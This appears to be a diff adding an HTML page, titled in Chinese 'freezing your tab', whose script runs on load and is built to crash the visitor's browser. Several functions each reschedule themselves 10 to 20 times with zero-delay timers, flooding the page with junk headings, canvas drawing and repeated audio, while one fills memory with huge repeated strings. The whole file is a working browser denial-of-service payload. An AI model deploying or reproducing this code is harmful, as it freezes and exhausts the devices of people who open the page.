@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>正在卡死你的标签页</title>
+
+    <style>
+        body {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<h1>正在卡死你的标签页...</h1>
+<canvas id="canvas" width="500" height="500"></canvas>
+<div id="theDiv"></div>
+
+<script>
+    let array = []
+
+    function randomInt(min, max) {
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function randomColor() {
+        return '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+    }
+
+    function newThing() {
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        setTimeout(newThing, 0)
+        let theNewH1 = document.createElement('h1');
+        theNewH1.textContent = 'ç˙ª™•˙ç¡™∂˙ç“™ºª˜£“πç˙¡“˜çæπ…™˙ç˜π¡ç∆˜π˙˜π˜çπ';
+        document.getElementById('theDiv').appendChild(theNewH1);
+    }
+
+    function draw() {
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        setTimeout(draw, 0);
+        let canvas = document.getElementById('canvas');
+        let ctx = canvas.getContext('2d');
+        ctx.fillStyle = randomColor();
+        let x = randomInt(0, canvas.width);
+        let y = randomInt(0, canvas.height);
+        ctx.fillRect(x, y, 20, 20);
+    }
+
+    function boomMem() {
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        setTimeout(boomMem, 0);
+        array.push('˙∫ç…ç´˙˙™£πª˙∂£ç∫“¡∫ç™ªº“˜ç™£ª∫ç∫ç™º“˜çç√™˙˜™ç˜∫…˜™ø“ç˜ø“™£˙ª™£ç™˜'.repeat(10000));
+    }
+
+    function newAudio() {
+        let theNewAudio = document.createElement('div');
+        theNewAudio.innerHTML = '<audio id="theAudio" src="/boom.mp3"></audio>'
+        document.getElementById('theDiv').appendChild(theNewAudio);
+        document.getElementById('theAudio').play()
+        setTimeout(newAudio, 100)
+    }
+
+    newThing();
+    newAudio();
+    draw();
+    boomMem();
+</script>
+</body>
+</html>
